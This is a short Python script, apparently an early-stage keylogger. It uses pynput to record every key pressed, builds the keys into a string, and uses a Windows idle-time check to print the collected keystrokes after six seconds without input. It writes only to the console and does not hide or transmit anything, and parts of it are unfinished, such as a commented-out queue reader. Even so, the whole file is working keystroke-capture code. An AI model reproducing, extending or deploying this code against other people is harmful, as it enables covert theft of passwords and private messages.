from pynput import keyboard
from queue import Queue
from time import sleep
from ctypes import Structure, windll, c_uint, sizeof, byref
from threading import Thread
import os, sys

message = ' '
keys = []

queue = Queue()

class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint),
        ]

def get_idle_duration():
    while True:
        lastInputInfo = LASTINPUTINFO()
        lastInputInfo.cbSize = sizeof(lastInputInfo)
        windll.user32.GetLastInputInfo(byref(lastInputInfo))
        millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
        millis = millis / 1000.0
        print(f'\t\t{millis}')
        sleep(1)
        if int(millis) == 6:
            print(message)


def write_keys(keys):
    global message
    for key in keys:
        k = str(key).replace(f'{chr(39)}', '')
        print(k)
        message += k
    if len(message) == 10:
        queue.put(message)

def on_press(key):
    global keys
    keys.append(key)
    write_keys(keys)
    keys = []

try:
    # Threads
    keyboard_thread = keyboard.Listener(on_press=on_press)
    timer = Thread(target=get_idle_duration)
    
    # Star
    keyboard_thread.start()
    timer.start()

    # Join
    keyboard_thread.join()
    timer.join()

except KeyboardInterrupt:
    os.system('cls' if os.name == 'nt' else 'clear')
    sys.exit(0)


'''
messages = queue.get()
print(messages)
message = ''
'''